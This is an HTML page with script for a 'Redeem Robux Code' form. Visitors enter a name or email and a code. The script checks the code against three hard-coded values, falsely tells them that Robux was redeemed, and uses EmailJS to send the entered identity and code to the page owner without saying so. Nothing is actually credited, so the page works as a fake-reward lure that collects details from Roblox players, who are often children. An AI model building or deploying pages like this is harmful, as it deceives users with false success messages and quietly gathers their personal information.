<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Redeem Robux Code</title>
</head>
<body>
  <h1>Redeem Robux Code</h1>

  <input id="user" placeholder="Your name or email (optional)">
  <input id="code" placeholder="Enter code">
  <button onclick="redeem()">Redeem</button>

  <div id="message"></div>

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("YOUR_PUBLIC_KEY"); // <-- replace with your EmailJS public key
    })();

    // Example codes
    const codes = {
      "FREE100": 100,
      "GIFT50": 50,
      "BONUS10": 10
    };

    function redeem() {
      const user = document.getElementById('user').value.trim() || "Anonymous";
      const code = document.getElementById('code').value.trim().toUpperCase();

      if (!code) {
        show("Please enter a code.");
        return;
      }

      if (!codes[code]) {
        show("Invalid or already used code.");
        return;
      }

      const amount = codes[code];
      show(`âœ… Code redeemed for ${amount} Robux!`);

      // Send you an email
      emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
        code: code,
        amount: amount,
        user: user
      }).then(() => {
        console.log("Email sent!");
      }, (err) => {
        console.error("Email failed:", err);
      });
    }

    function show(text) {
      document.getElementById('message').textContent = text;
    }
  </script>
</body>
</html>
